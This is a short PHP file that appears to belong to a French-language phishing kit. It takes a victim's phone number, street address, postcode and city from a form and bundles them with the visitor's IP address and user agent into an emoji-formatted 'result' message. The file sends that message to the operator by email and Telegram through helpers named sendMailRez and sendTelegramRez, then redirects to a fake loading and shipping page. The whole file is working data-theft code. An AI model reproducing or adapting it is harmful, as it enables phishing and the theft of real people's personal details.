<?php
include '../../settings.php';
include '../core/funcs.php';
session_start();

if (isset($_POST['tel'],$_POST['address'],$_POST['zip'],$_POST['city'])) {
    $_SESSION['tel'] = $_POST['tel'];
    $_SESSION['address'] = $_POST['address'];
    $_SESSION['zip'] = $_POST['zip'];
    $_SESSION['city'] = $_POST['city'];
    $message = "≡≡≡≡≡≡≡≡ ☫🛖☫ ≡≡≡≡≡≡≡≡

☎️ Numéro de téléphone : ".$_SESSION['tel']."              
🏘 Ville : ".$_SESSION['city']."
🛖 Adresse : ".$_SESSION['address']."
🗳 Code Postal : ".$_SESSION['zip']."
                 
≡≡≡≡≡≡≡≡ ☫📶☫ ≡≡≡≡≡≡≡≡
      
📍 Adresse IP : ".$_SERVER['REMOTE_ADDR']."
📡 User Agent :" . $_SERVER['HTTP_USER_AGENT'];
    update('informations');
    sendMailRez($email,"🛖 + 1 Nouveaux Addr. postale : [".$_SESSION['zip']."] 🛖",$message);
    sendTelegramRez($message, False);
    header('location: ../loading.php?page=ship.php');
}